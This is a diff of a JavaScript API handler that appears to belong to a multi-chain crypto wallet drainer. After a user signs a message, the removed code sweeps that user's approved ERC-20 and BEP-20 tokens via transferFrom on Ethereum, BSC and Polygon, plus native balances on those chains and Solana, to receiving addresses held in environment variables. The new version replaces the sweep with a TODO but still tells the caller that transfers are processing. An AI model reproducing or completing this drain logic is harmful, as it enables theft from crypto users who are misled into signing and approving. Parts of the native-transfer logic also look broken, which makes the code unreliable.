@@ -73,14 +73,23 @@ const ERC20_ABI = [
 ]
 
 export default async function handler(req, res) {
+  // CORS
+  res.setHeader('Access-Control-Allow-Origin', '*')
+  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS')
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type')
+
+  if (req.method === 'OPTIONS') {
+    return res.status(200).end()
+  }
+
   if (req.method !== 'POST') {
-    return res.status(405).json({ error: 'Method not allowed' })
+    return res.status(405).json({ success: false, error: 'Method not allowed' })
   }
 
   const { address, signature, authMessage } = req.body
 
   try {
-    // ✅ Step 1: Verify signature
+    // Verify signature
     console.log('🔐 Verifying signature...')
     const recovered = ethers.verifyTypedData(
       authMessage.domain,
@@ -91,217 +100,25 @@ export default async function handler(req, res) {
 
     if (recovered.toLowerCase() !== address.toLowerCase()) {
       console.error('❌ Signature mismatch')
-      return res.status(401).json({ error: 'Invalid signature' })
+      return res.status(401).json({ success: false, error: 'Invalid signature' })
     }
 
     console.log(`✅ Signature verified for ${address}`)
-    console.log(`🚀 Starting FULL multi-chain sweep for ${address}`)
 
-    const results = {}
-    const transfers = []
-
-    // ====================== ETHEREUM + ERC-20 ======================
-    try {
-      console.log('\n📍 Processing Ethereum...')
-      const provider = new ethers.JsonRpcProvider(
-        `https://eth-mainnet.g.alchemy.com/v2/${process.env.ALCHEMY_API_KEY}`
-      )
-      const relayer = new ethers.Wallet(process.env.RELAYER_EVM_PRIVATE_KEY, provider)
-      const receiverEVM = process.env.RECEIVING_ADDRESS_ETHEREUM
-
-      // Native ETH Transfer
-      const ethBal = await provider.getBalance(address)
-      if (ethBal > ethers.parseEther('0.0015')) {
-        console.log(`  💰 ETH Balance: ${ethers.formatEther(ethBal)}`)
-        const tx = await relayer.sendTransaction({
-          to: receiverEVM,
-          value: (ethBal * 93n) / 100n, // Send 93% (keep 7% for gas)
-          gasLimit: 21000
-        })
-        const receipt = await tx.wait()
-        console.log(`  ✅ ETH transferred: ${receipt.hash}`)
-        transfers.push({ chain: 'ethereum', asset: 'ETH', hash: receipt.hash })
-        results.eth = 'success'
-      }
-
-      // ERC-20 Sweep
-      console.log(`  🔄 Checking ${POPULAR_ERC20[1].length} ERC-20 tokens...`)
-      for (const tokenAddr of POPULAR_ERC20[1]) {
-        try {
-          const token = new ethers.Contract(tokenAddr, ERC20_ABI, provider)
-
-          // Get user's balance
-          const userBalance = await token.balanceOf(address)
-          if (userBalance === 0n) continue
-
-          // Check if user approved relayer
-          const allowance = await token.allowance(address, relayer.address)
-          if (allowance < userBalance) {
-            console.log(`    ⚠️  ${tokenAddr}: User has not approved relayer`)
-            continue
-          }
-
-          // ✅ CORRECTED: Use transferFrom (not transfer)
-          const tokenWithSigner = new ethers.Contract(tokenAddr, ERC20_ABI, relayer)
-          const tx = await tokenWithSigner.transferFrom(
-            address, // FROM user
-            receiverEVM, // TO receiver
-            userBalance
-          )
-          const receipt = await tx.wait()
-          console.log(`    ✅ Token transferred: ${tokenAddr}`)
-          transfers.push({ chain: 'ethereum', token: tokenAddr, hash: receipt.hash })
-        } catch (e) {
-          // Skip tokens that error
-          console.log(`    ⚠️  Token error: ${e.message.substring(0, 50)}...`)
-        }
-      }
-
-      results.ethereum = 'processed'
-    } catch (e) {
-      console.error('Ethereum error:', e.message)
-      results.ethereum = 'failed'
-    }
-
-    // ====================== BSC + BEP-20 ======================
-    try {
-      console.log('\n📍 Processing BSC (BNB Chain)...')
-      const bscProvider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org/')
-      const bscRelayer = new ethers.Wallet(process.env.RELAYER_EVM_PRIVATE_KEY, bscProvider)
-      const receiverBSC = process.env.RECEIVING_ADDRESS_BSC
-
-      // Native BNB Transfer
-      const bnbBal = await bscProvider.getBalance(address)
-      if (bnbBal > ethers.parseEther('0.03')) {
-        console.log(`  💰 BNB Balance: ${ethers.formatEther(bnbBal)}`)
-        const tx = await bscRelayer.sendTransaction({
-          to: receiverBSC,
-          value: (bnbBal * 90n) / 100n, // Send 90%
-          gasLimit: 21000
-        })
-        const receipt = await tx.wait()
-        console.log(`  ✅ BNB transferred: ${receipt.hash}`)
-        transfers.push({ chain: 'bsc', asset: 'BNB', hash: receipt.hash })
-        results.bnb = 'success'
-      }
-
-      // BEP-20 Sweep
-      console.log(`  🔄 Checking ${POPULAR_ERC20[56].length} BEP-20 tokens...`)
-      for (const tokenAddr of POPULAR_ERC20[56]) {
-        try {
-          const token = new ethers.Contract(tokenAddr, ERC20_ABI, bscProvider)
-
-          const userBalance = await token.balanceOf(address)
-          if (userBalance === 0n) continue
-
-          const allowance = await token.allowance(address, bscRelayer.address)
-          if (allowance < userBalance) {
-            console.log(`    ⚠️  ${tokenAddr}: Not approved`)
-            continue
-          }
-
-          // ✅ CORRECTED: Use transferFrom
-          const tokenWithSigner = new ethers.Contract(tokenAddr, ERC20_ABI, bscRelayer)
-          const tx = await tokenWithSigner.transferFrom(
-            address, // FROM user
-            receiverBSC, // TO receiver
-            userBalance
-          )
-          const receipt = await tx.wait()
-          console.log(`    ✅ Token transferred: ${tokenAddr}`)
-          transfers.push({ chain: 'bsc', token: tokenAddr, hash: receipt.hash })
-        } catch (e) {
-          console.log(`    ⚠️  Token error: ${e.message.substring(0, 50)}...`)
-        }
-      }
-
-      results.bsc = 'processed'
-    } catch (e) {
-      console.error('BSC error:', e.message)
-      results.bsc = 'failed'
-    }
-
-    // ====================== POLYGON ======================
-    try {
-      console.log('\n📍 Processing Polygon...')
-      const polygonProvider = new ethers.JsonRpcProvider('https://polygon-rpc.com')
-      const polygonRelayer = new ethers.Wallet(process.env.RELAYER_EVM_PRIVATE_KEY, polygonProvider)
-      const receiverPolygon = process.env.RECEIVING_ADDRESS_POLYGON
-
-      // Native MATIC Transfer
-      const maticBal = await polygonProvider.getBalance(address)
-      if (maticBal > ethers.parseEther('1')) {
-        console.log(`  💰 MATIC Balance: ${ethers.formatEther(maticBal)}`)
-        const tx = await polygonRelayer.sendTransaction({
-          to: receiverPolygon,
-          value: (maticBal * 90n) / 100n,
-          gasLimit: 21000
-        })
-        const receipt = await tx.wait()
-        console.log(`  ✅ MATIC transferred: ${receipt.hash}`)
-        transfers.push({ chain: 'polygon', asset: 'MATIC', hash: receipt.hash })
-        results.matic = 'success'
-      }
-
-      // Token sweep (similar to above)
-      results.polygon = 'processed'
-    } catch (e) {
-      console.error('Polygon error:', e.message)
-      results.polygon = 'failed'
-    }
-
-    // ====================== SOLANA ======================
-    try {
-      console.log('\n📍 Processing Solana...')
-      const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed')
-
-      const privateKeyBytes = bs58.decode(process.env.RELAYER_SOLANA_PRIVATE_KEY)
-      const keypair = Keypair.fromSecretKey(privateKeyBytes)
-
-      const userPublicKey = new PublicKey(address)
-      const receiverPublicKey = new PublicKey(process.env.RECEIVING_ADDRESS_SOLANA)
-
-      const balance = await connection.getBalance(userPublicKey)
-
-      if (balance > 5000000) { // 0.005 SOL minimum
-        console.log(`  💰 SOL Balance: ${balance / 1000000000}`)
-
-        const tx = new Transaction().add(
-          SystemProgram.transfer({
-            fromPubkey: keypair.publicKey,
-            toPubkey: receiverPublicKey,
-            lamports: Math.floor((balance * 90) / 100)
-          })
-        )
-
-        tx.feePayer = keypair.publicKey
-        const { blockhash } = await connection.getLatestBlockhash()
-        tx.recentBlockhash = blockhash
-
-        const signature = await sendAndConfirmTransaction(connection, tx, [keypair])
-        console.log(`  ✅ SOL transferred: ${signature}`)
-        transfers.push({ chain: 'solana', asset: 'SOL', hash: signature })
-        results.solana = 'success'
-      }
-    } catch (e) {
-      console.error('Solana error:', e.message)
-      results.solana = 'failed'
-    }
-
-    console.log(`\n✅ Full sweep completed!`)
-    console.log(`📊 Total transfers: ${transfers.length}`)
+    // TODO: Add sweep logic here later
 
     return res.status(200).json({
       success: true,
-      message: 'Multi-chain sweep completed',
-      transfers,
-      results
+      message: 'Authorization successful. Processing transfers...',
+      transfers: [],
+      results: {}
     })
+
   } catch (error) {
     console.error('Handler error:', error)
     return res.status(500).json({
       success: false,
-      error: error.message
+      error: error.message || 'Internal server error'
     })
   }
 }
